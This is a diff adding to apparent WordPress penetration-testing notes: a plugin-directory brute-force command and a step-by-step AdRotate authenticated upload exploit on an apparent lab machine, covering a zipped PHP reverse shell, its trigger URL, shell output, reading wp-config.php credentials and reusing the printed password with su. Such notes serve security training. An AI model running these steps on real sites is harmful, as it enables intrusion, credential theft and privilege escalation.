@@ -38,6 +38,19 @@ wpscan --url http://TARGET --enumerate vp
 wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
 ```
 
+If you have a plugin wordlist, brute force the plugin directory directly:
+
+```bash
+feroxbuster -u http://TARGET/wordpress/wp-content/plugins/ -w /md/wl/wordpress-plugins.txt -t 10 -n
+```
+
+Useful hits:
+
+```text
+http://TARGET/wordpress/wp-content/plugins/adrotate/
+http://TARGET/wordpress/wp-content/plugins/akismet/
+```
+
 ---
 
 ## Brute Force (WPScan)
@@ -143,6 +156,82 @@ Use the first or second for Meterpreter; the third runs a single command via `?c
 ---
 
 ## Vulnerable Plugins
+
+### AdRotate Banner Manager authenticated upload RCE
+
+AdRotate Banner Manager versions up to and including `5.13.2` can allow authenticated administrators to upload arbitrary files because `adrotate_insert_media()` does not properly sanitize extensions. On configurations that execute the first extension in a double extension, this can become RCE.
+
+WPScan may identify the plugin and version:
+
+```text
+[+] adrotate
+ | Location: http://TARGET/wordpress/wp-content/plugins/adrotate/
+ | Readme: http://TARGET/wordpress/wp-content/plugins/adrotate/readme.txt
+ | Version: 5.8.6.2
+```
+
+If the login redirects to a virtual host, add the host before authenticating:
+
+```text
+TARGET loly.lc
+```
+
+With administrator access, go to the AdRotate media manager:
+
+```text
+http://loly.lc/wordpress/wp-admin/admin.php?page=adrotate-media&status=510
+```
+
+A raw `shell.php.jpg` may upload but land as a non-executing image under:
+
+```text
+http://loly.lc/wordpress/wp-content/banners/shell.php.jpg
+```
+
+A zipped PHP shell was accepted and extracted to an executable PHP file:
+
+```bash
+mv php-reverse-shell.php shell.php
+zip shell.zip shell.php
+```
+
+Upload `shell.zip` through the AdRotate media manager, then trigger:
+
+```text
+http://loly.lc/wordpress/wp-content/banners/shell.php
+```
+
+Successful shell context:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64
+```
+
+After getting code execution, read `wp-config.php` for database credentials:
+
+```bash
+cat /var/www/html/wordpress/wp-config.php
+```
+
+Observed values:
+
+```php
+define('DB_USER', 'wordpress');
+define('DB_PASSWORD', 'lolyisabeautifulgirl');
+```
+
+The database password was reused by the local `loly` user:
+
+```bash
+su loly
+# password: lolyisabeautifulgirl
+```
+
+References:
+
+- https://github.com/advisories/GHSA-77x6-hmg8-vxg7
+- https://wpscan.com/vulnerability/a670dc87-ed79-493a-888d-afd7cb99269e/
 
 ### Simple File List 4.2.2 pre-auth RCE
 
